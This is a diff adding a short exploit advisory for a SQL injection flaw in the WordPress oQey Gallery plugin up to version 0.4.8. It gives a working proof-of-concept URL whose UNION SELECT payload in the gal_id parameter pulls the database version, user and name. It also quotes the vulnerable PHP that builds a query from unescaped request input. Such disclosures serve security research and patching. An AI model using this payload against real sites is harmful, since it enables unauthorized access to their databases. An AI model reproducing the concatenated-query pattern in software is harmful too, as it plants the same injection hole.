@@ -1,0 +1,21 @@
+# Exploit Title: WordPress oQey Gallery plugin <= 0.4.8 SQL Injection Vulnerability
+# Date: 2011-09-05
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/oqey-gallery.0.4.8.zip
+# Version: 0.4.8 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/oqey-gallery/getimages.php?gal_id=0' UNION ALL SELECT 1,2,3,4,5,6,7,CONCAT_WS(CHAR(95),version(),current_user(),database()),9,10%23
+
+---------------
+Vulnerable code
+---------------
+if(isset($_REQUEST['gal_id'])){
+    ...
+    $data = explode("-", $_REQUEST['gal_id']);
+    $id = $data[0];
+    ...
+    $s = $wpdb->get_row("SELECT * FROM $oqey_galls WHERE id ='".$id."' ");
